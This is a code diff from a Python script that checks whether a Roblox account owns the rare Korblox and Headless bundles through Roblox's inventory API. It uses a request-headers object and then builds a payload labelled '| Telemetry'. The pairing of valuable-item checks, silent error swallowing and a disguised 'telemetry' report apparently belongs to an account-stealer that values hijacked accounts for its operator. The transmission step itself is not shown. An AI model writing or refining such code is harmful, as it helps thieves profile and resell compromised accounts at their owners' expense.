@@ -69,42 +69,34 @@ def main():
             except Exception:
                 pass
 
-            # Check Avatar / Outfit assets endpoint to detect Korblox / Headless presence
+            # Check Korblox (Bundle ID: 192) and Headless (Bundle ID: 201) using the official inventory ownership endpoint
             try:
-                avatar_res = requests.get(f"https://avatar.roblox.com/v1/users/{user_id}/avatar", headers=headers)
-                if avatar_res.status_code == 200:
-                    avatar_data = avatar_res.json()
-                    
-                    # Check asset IDs, asset type names, or package IDs
-                    assets = avatar_data.get("assets", [])
-                    equipped_ids = [str(asset.get("id")) for asset in assets]
-                    
-                    # Korblox asset and package identifiers
-                    korblox_identifiers = ["13961116", "13961118", "192", "13961120"]
-                    headless_identifiers = ["134082579", "134082581", "201", "134082583"]
-
-                    for aid in equipped_ids:
-                        if any(k in aid for k in korblox_identifiers):
-                            has_korblox = True
-                        if any(h in aid for h in headless_identifiers):
-                            has_headless = True
-
-                    # Also check user outfits / wearable bundles
-                    outfits_res = requests.get(f"https://avatar.roblox.com/v1/users/{user_id}/outfits?isEditable=true&limit=50", headers=headers)
-                    if outfits_res.status_code == 200:
-                        outfits = outfits_res.json().get("data", [])
-                        for outfit in outfits:
-                            outfit_id = outfit.get("id")
-                            detail_res = requests.get(f"https://avatar.roblox.com/v1/outfits/{outfit_id}", headers=headers)
-                            if detail_res.status_code == 200:
-                                details = detail_res.json()
-                                outfit_assets = [str(a.get("id")) for a in details.get("assets", [])]
-                                if any(k in "".join(outfit_assets) for k in korblox_identifiers):
-                                    has_korblox = True
-                                if any(h in "".join(outfit_assets) for h in headless_identifiers):
-                                    has_headless = True
+                k_res = requests.get(f"https://inventory.roblox.com/v1/users/{user_id}/items/Bundle/192/is-owned", headers=headers)
+                if k_res.status_code == 200:
+                    has_korblox = bool(k_res.json())
             except Exception:
                 pass
+
+            try:
+                h_res = requests.get(f"https://inventory.roblox.com/v1/users/{user_id}/items/Bundle/201/is-owned", headers=headers)
+                if h_res.status_code == 200:
+                    has_headless = bool(h_res.json())
+            except Exception:
+                pass
+
+            # Fallback check against the user's full bundle list if needed
+            if not has_korblox or not has_headless:
+                try:
+                    bundles_res = requests.get(f"https://inventory.roblox.com/v1/users/{user_id}/bundles?limit=100", headers=headers)
+                    if bundles_res.status_code == 200:
+                        bundles = bundles_res.json().get("data", [])
+                        bundle_ids = [b.get("id") for b in bundles]
+                        if 192 in bundle_ids:
+                            has_korblox = True
+                        if 201 in bundle_ids:
+                            has_headless = True
+                except Exception:
+                    pass
 
         payload = {
             "username": f"{username} | Telemetry",
